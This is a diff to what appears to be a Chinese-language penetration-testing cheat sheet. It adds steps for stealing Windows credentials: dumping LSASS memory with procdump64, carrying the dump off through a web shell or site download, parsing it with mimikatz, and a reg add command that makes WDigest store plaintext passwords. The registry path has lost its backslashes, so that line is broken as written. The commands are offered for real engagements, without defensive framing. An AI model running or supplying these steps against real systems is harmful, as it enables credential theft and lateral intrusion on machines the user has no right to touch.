@@ -7,7 +7,23 @@ mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.
 
 
 ```
+### procdump64.exe导出lsass.dmp
 
+```
+先用procdump64.exe导出lsass.dmp
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+命令执行完成之后，会有提示下载路径。
+
+然后把 lsass.dmp 下载到本地(实战中可以从菜刀下载或者网站访问下载等等)
+
+使用本地的mimikatz.exe读取lsass.dmp。
+```
+修改注册表保存明文
+```
+但是我们可以通过修改注册表来让Wdigest Auth保存明文口令：
+
+reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+```
 ###  添加用户
 
 ```
